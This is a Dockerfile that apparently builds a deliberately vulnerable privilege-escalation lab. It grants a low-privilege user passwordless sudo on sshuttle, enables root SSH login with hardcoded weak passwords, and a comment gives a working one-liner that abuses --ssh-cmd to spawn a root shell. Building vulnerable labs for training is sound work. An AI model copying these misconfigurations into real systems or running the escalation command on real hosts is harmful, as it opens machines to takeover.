FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_sshuttle
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/sshuttle as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and sshuttle
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        sshuttle \
        python3 \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Verify sshuttle is installed
RUN which sshuttle && ls -la $(which sshuttle)

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# sshuttle accepts --ssh-cmd which allows specifying an arbitrary command
# to use as the SSH client. This can be abused to spawn a root shell:
#   sudo sshuttle -r x --ssh-cmd '/bin/sh -c "/bin/sh 0<&2 1>&2"' localhost
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/sshuttle" > /etc/sudoers.d/sshuttle && \
    chmod 440 /etc/sudoers.d/sshuttle

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]